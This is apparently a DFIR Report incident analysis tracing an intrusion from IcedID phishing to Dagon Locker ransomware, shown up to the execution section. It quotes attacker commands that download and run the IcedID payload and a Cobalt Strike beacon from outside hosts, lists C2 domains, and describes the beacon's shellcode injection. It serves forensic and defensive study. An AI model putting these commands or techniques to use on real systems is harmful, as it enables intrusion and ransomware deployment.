	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Friday, October 25, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-32050" class="post-32050 post type-post status-publish format-standard hentry category-adfind category-cobaltstrike category-dagonlocker category-icedid entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
		
			<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
		
			<a class="category-color-130" href="https://thedfirreport.com/category/dagonlocker/">dagonlocker</a>
		
			<a class="category-color-67" href="https://thedfirreport.com/category/icedid/">icedid</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">From IcedID to Dagon Locker Ransomware in 29 Days</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/" rel="bookmark"><time class="entry-date published" datetime="2024-04-29T01:21:08+00:00">April 29, 2024</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 id="key" class="wp-block-heading"><a href="#key">Key Takeaways</a></h2>

<ul>
<li>In August 2023, we observed an intrusion that started with a phishing campaign using PrometheusTDS to distribute IcedID.</li>
<li>IcedID dropped and executed a Cobalt Strike beacon, which was then used through-out the intrusion.</li>
<li>The threat actor leveraged a bespoke PowerShell tool known as AWScollector to facilitate a range of malicious activities including discovery, lateral movement, data exfiltration, and ransomware deployment.</li>
<li>Group Policy was used to distribute Cobalt Strike beacons at login to a specific privileged user group.</li>
<li>The threat actor utilized a suite of tools to support their activities, deploying Rclone, Netscan, Nbtscan, AnyDesk, Seatbelt, Sharefinder, and AdFind.</li>
<li>This case had a TTR (time to ransomware) of 29 days.</li>
</ul>

<p>More information about IcedID and Dagon Locker can be found in the following reports: <a href="https://www.sentinelone.com/anthology/dagon-locker/" target="_blank" rel="noreferrer noopener">SentinelOne</a>, <a href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" target="_blank" rel="noreferrer noopener">The DFIR Report</a>, and <a href="https://www.group-ib.com/blog/prometheus-tds/" target="_blank" rel="noreferrer noopener">Group-IB</a>.</p>
<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/" target="_blank" rel="noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/reports/id1728699064" target="_blank" rel="noopener">Apple</a>, <a href="https://www.youtube.com/@TheDFIRReport/videos" target="_blank" rel="noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp" target="_blank" rel="noopener">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports" target="_blank" rel="noopener">Amazon</a>.</p>
<h2 id="services" class="wp-block-heading"><a href="#services">Services</a></h2>
<p>

</p>
<ul class="wp-block-list">
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>



<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>



<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>



<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>



<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>

</p>
<p>Contact us today for a demo!</p>

<h4>Table of Contents:</h4>
<ul>
<li><a href="#case-summary">Case Summary</a></li>
<li><a href="#services">Services</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#initial-access">Initial Access</a></li>
<li><a href="#execution">Execution</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#defense-evasion">Defense Evasion</a></li>
<li><a href="#credential-access">Credential Access</a></li>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#lateral-movement">Lateral Movement</a></li>
<li><a href="#collection">Collection</a></li>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#exfiltration">Exfiltration</a></li>
<li><a href="#impact">Impact</a></li>
<li><a href="#timeline">Timeline</a></li>
<li><a href="#diamond-model">Diamond Model</a></li>
<li><a href="#indicators">Indicators</a></li>
<li><a href="#detections">Detections</a></li>
<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
</ul>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>This intrusion started in August 2023 with a phishing campaign that distributed IcedID malware. This phishing operation utilized the Prometheus Traffic Direction System (TDS) to deliver the malware. Victims were directed to a fraudulent website, mimicking an Azure download portal. Here, they were prompted to download a malicious JavaScript file. Upon executing this file, a multi-step attack was triggered. Initially, a batch file was generated and executed on the user’s system. This batch file used the <code>curl</code> command to download an IcedID DLL file. Finally, this DLL file was executed, completing the malware installation process.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Once the DLL file was executed, the IcedID malware established persistence by creating a scheduled task on the infected system. This ensured that the malware would continue to operate even after the system was restarted. Following this, the malware established a command and control (C2) connection with the IcedID servers. Through this connection, it executed a series of discovery commands using standard Windows utilities to gather information about the infected system. About 30 hours after inactivity, the IcedID malware downloaded and executed a Cobalt Strike beacon.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Cobalt Strike beacon was staged on the temporary file-sharing website, file.io, and was downloaded to the infected host using PowerShell. Once executed, the threat actor leveraged commonly used system utilities such as <code>net</code>, <code>whoami</code>, <code>nltest</code>, and <code>ping</code> to conduct discovery operations from the Cobalt Strike beacon. Shortly after these initial discovery operations, we observed access to the Local Security Authority Subsystem Service (LSASS) process, indicating attempts to access credentials. There was also evidence of the <code>GetSystem</code> command being used for privilege escalation, allowing the attacker to obtain higher-level system privileges.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Within just five minutes of executing the Cobalt Strike beacon, the threat actor initiated lateral movement within the network. They transferred a Cobalt Strike beacon to a domain controller using the Server Message Block (SMB) protocol. This beacon was then executed via remote services.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor continued their discovery activities on both the initial beachhead and the domain controller, specifically targeting file shares. To accomplish this, they utilized a combination of net commands, AdFind, and Sharefinder to identify and access these network shares. After locating the desired network shares, they deployed Rclone, though its usage was brief. Next, the threat actor shifted to using a custom PowerShell tool, named AWSCollector. This tool&#8217;s initial deployment involved executing a series of system discovery commands on remote hosts through its systeminfo module.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Approximately an hour and a half after initiating data exfiltration with Rclone, the threat actor transitioned to their custom AWSCollector script, to continue the data transfer to AWS S3 bucket storage. Over the ensuing hours, they continued discovery operations and even deployed a Speedtest tool, likely to assess the network speed and determine the feasibility and duration of their exfiltration efforts. As the data exfiltration progressed, they expanded their foothold in the environment by deploying Cobalt Strike beacons to additional hosts. These were copied to hosts using SMB and the Windows copy utility, followed by the execution of the beacon by remote WMIC commands.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>As the situation progressed into the third day, the threat actor remained engaged and active, continuing their data exfiltration activities. They also deployed discovery tools such as Seatbelt and SoftPerfect Netscan to further explore the network. On the fourth day, the focus shifted to the virtualization infrastructure. The threat actor executed various commands to gather information about the virtualization components, which involved the zipping and suspected exfiltration of targeted documents pertinent to virtualization. Additionally, on network shares, the threat actor located and reviewed documents containing passwords for the organization.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Entering the fifth day, the threat actor continued discovery efforts using many of the same tools previously observed. During this period, they also began dumping Windows event logs and executing various WMIC discovery commands to gain further insight into the environment. The activities on the sixth and seventh days mirrored those of the previous days. On the eighth day, the threat actor deployed AnyDesk on a domain controller using a PowerShell script. This script not only installed AnyDesk but also created a new user account and added it to the local administrators group. On this day we also observed the threat actor deploy a new Cobalt Strike beacon.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Using the AnyDesk access, the threat actor logged into the domain controller and accessed various system administrator utilities, including Sites and Services, Administrative Center, Domains and Trusts, Users and Computers, and Group Policy. The focus of their activity seemed to be Group Policy, where they attempted to create a Logon script for the environment.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Three days after their previous actions, the threat actor returned to modify the Group Policy settings they had initially focused on. Following these changes, they expanded their operational scope by installing AnyDesk and Cobalt Strike beacons on additional hosts. Over the next several days, the threat actor continued to return, utilizing the graphical user interfaces (GUI) of Windows administrative tools to review and likely analyze data.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the 28th day of activity, the threat actor resumed operations by attempting to configure a domain controller to proxy RDP access across another network segment using the netsh utility. However, this configuration failed to achieve their intended result and was promptly removed. The threat actor also engaged in network reconnaissance by requesting Kerberos Service Principal Names (SPNs) using the <code>setspn</code> command-line tool.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the 29th day, they started running discovery checks using net commands. About five hours later, they prepared for their final operations by staging a Dagon Locker ransomware file on a domain controller. Utilizing their custom AWSCollector script, the ransomware was deployed via SMB to remote hosts. The script also generated a batch script to disable services, delete shadow copies, and execute the ransomware, leading to domain wide ransomware. This entire process resulted in a Time to Ransomware (TTR) of 684 hours, over 29 days.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If you would like to get an email when we publish a new report, please subscribe <a href="https://thedfirreport.com/subscribe/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading --><!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Analysis and reporting completed by <a href="https://twitter.com/r3nzsec" target="_blank" rel="noreferrer noopener">r3nzsec</a>, <a href="https://twitter.com/angelo_violetti" target="_blank" rel="noreferrer noopener">angelo_violetti</a> &amp; UC1</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>In August 2023 we observed an IcedID e-mail phishing campaign, utilizing <a href="https://twitter.com/hashtag/PrometheusTDS?src=hashtag_click" target="_blank" rel="noreferrer noopener">PrometheusTDS</a> URLs directly in email.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://twitter.com/ffforward" target="_blank" rel="noreferrer noopener">@ffforward</a> reported the distribution on <a href="https://twitter.com/ffforward/status/1696813291266564320?s=20" target="_blank" rel="noreferrer noopener">Twitter</a>:</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-32057" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-001.png" alt="" width="593" height="568" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-001.png 593w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-001-300x287.png 300w" sizes="(max-width: 593px) 100vw, 593px" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>For a full breakdown on the TDS see this <a href="https://www.group-ib.com/blog/prometheus-tds/" target="_blank" rel="noreferrer noopener">report</a> by Group-IB.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Once the user clicked the link, they would be presented with an Azure looking page containing a captcha, and if they pass all the filtering requirements of the TDS they would be presented with a download for a JavaScript file, <code>Document_Scan_468.js</code> in this intrusion.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>IcedID</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-002.png"><img decoding="async" class="aligncenter size-full wp-image-32058" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-002.png" alt="" width="6000" height="3375" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-002.png 6000w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-002-300x169.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-002-1024x576.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-002-768x432.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-002-1536x864.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-002-2048x1152.png 2048w" sizes="(max-width: 6000px) 100vw, 6000px" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>When the user executed the downloaded Javascript file, <code>Document_Scan_468.js</code>, the following happened:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>A bat file was created using a curl command to download the IcedID payload from <code>moashraya[.]com</code>.<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>C:\Windows\System32\cmd.exe" /c echo curl https://moashraya[.]com/out/t.php --output "%temp%\magni.waut.a" --ssl no-revoke --insecure --location &gt; "%temp%\magni.w.bat</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Execution of the batch script.<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>cmd.exe /c "%temp%\magnu.w.bat"</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>After downloading, the file <code>magni.waut.a</code> is renamed to <code>magni.w</code>.<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>cmd.exe /c ren "%temp%\magni.waut.a" "magni.w"</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using rundll32.exe, it executes the function <code>scab</code> with the arguments <code>\k arabika752</code> from the downloaded and renamed file <code>magni.w</code>.<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>rundll32 "%temp%\magni.w", scab \k arabika752</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Shortly after, we see <code>rundll32.exe</code> accessing and injecting into <code>svchost.exe</code></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-003.png"><img decoding="async" class="aligncenter size-full wp-image-32059" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-003.png" alt="" width="493" height="244" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-003.png 493w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-003-300x148.png 300w" sizes="(max-width: 493px) 100vw, 493px" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Using memory captured from the system and processing it with <a href="https://github.com/ufrisk/MemProcFS" target="_blank" rel="noreferrer noopener">MemprocFS;</a> we can see via the memory, YARA scanning confirmation of the IcedID injection into process 4492.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32060" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-004.png" alt="" width="776" height="704" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-004.png 776w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-004-300x272.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-004-768x697.png 768w" sizes="(max-width: 776px) 100vw, 776px" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This process then started communicating out to the following C2 domains:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>ewacootili[.]com (151.236.9[.]176)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ultrascihictur[.]com (159.223.95[.]82)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>magiraptoy[.]com (194.58.68[.]187)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>And then deleted the file<code>%temp%\festival-.dat</code>. This was most likely an update to the IcedID configuration which gets loaded.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A summary of the discovery commands, and other activity can be seen in the <a href="#discovery">Discovery</a> section.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Decoding the obfuscated javascript</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Document_Scan_468.js</code> employed a simple obfuscating technique. The technique consists of splitting the commands to be run into chunks of three, and concatenating them together. The same technique was used to obfuscate the JS functions as well.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32061" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-005.png" alt="" width="3452" height="2042" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-005.png 3452w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-005-300x177.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-005-1024x606.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-005-768x454.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-005-1536x909.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-005-2048x1211.png 2048w" sizes="(max-width: 3452px) 100vw, 3452px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32062" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-006.png" alt="" width="2652" height="1734" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-006.png 2652w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-006-300x196.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-006-1024x670.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-006-768x502.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-006-1536x1004.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-006-2048x1339.png 2048w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-006-765x500.png 765w" sizes="(max-width: 2652px) 100vw, 2652px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32063" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-007.png" alt="" width="2268" height="1810" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-007.png 2268w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-007-300x239.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-007-1024x817.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-007-768x613.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-007-1536x1226.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-007-2048x1634.png 2048w" sizes="(max-width: 2268px) 100vw, 2268px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32064" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-008.png" alt="" width="3302" height="2166" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-008.png 3302w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-008-300x197.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-008-1024x672.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-008-768x504.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-008-1536x1008.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-008-2048x1343.png 2048w" sizes="(max-width: 3302px) 100vw, 3302px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32065" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-009.png" alt="" width="3186" height="2282" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-009.png 3186w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-009-300x215.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-009-1024x733.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-009-768x550.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-009-1536x1100.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-009-2048x1467.png 2048w" sizes="(max-width: 3186px) 100vw, 3186px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Cobalt Strike DLL HTTPS Beacon</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The first Cobalt Strike beacon was downloaded, and subsequently executed, by the threat actor from file.io through the following PowerShell commands.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">powershell.exe(New-Object System.Net.WebClient).DownloadFile("https://file[.]io/OUXPza4b4uxZ", "C:\ProgramData\update.dll")
%WINDIR%\system32\rundll32.exe" update.dll,HTVIyKUVoTzv
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Cobalt Strike PowerShell HTTPS Beacon</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Via the Cobalt Strike command and control server, the threat actor generated a PowerShell script which injected a stageless beacon into memory.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the first part of the script, there are two defined functions, <code>func_get_proc_address </code>and <code>func_get_delegate_type</code>, which are used to dynamically load and execute unmanaged code. Subsequently, a long BASE64 encoded string is defined which corresponds to the Cobalt Strike shellcode.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32066" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-010.png" alt="" width="2002" height="643" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-010.png 2002w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-010-300x96.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-010-1024x329.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-010-768x247.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-010-1536x493.png 1536w" sizes="(max-width: 2002px) 100vw, 2002px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The BASE64 string is then XOR decoded with a decimal key equal to <code>35</code>. In order to inject the decoded shellcode, the script retrieves the function pointer for the Windows APIs function <code>GetModuleHandleA</code> and <code>GetProcAddress</code> that are needed to obtain a pointer to <code>VirtualAlloc</code>. The call to VirtualAlloc creates a new memory section with AllocationType <code>MEM_COMMIT | MEM_RESERVERE</code> (0x3000) and MemoryProtection <code>ExecuteReadWrite</code> (0x40). This type of variables passed to VirtualAlloc are classic signs of process injection. Subsequently, the shellcode is copied into the newly created region of memory and then executed through the Invoke() function.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32067" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-011.png" alt="" width="2002" height="379" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-011.png 2002w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-011-300x57.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-011-1024x194.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-011-768x145.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-011-1536x291.png 1536w" sizes="(max-width: 2002px) 100vw, 2002px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The BASE64 string can be easily decoded through CyberChef to get the Cobalt Strike shellcode. It is possible to recognize the classic MZ header (<code>magic_mz_x86</code> and <code>magic_mz_x64</code>): <code>MZARUH</code>.</p>
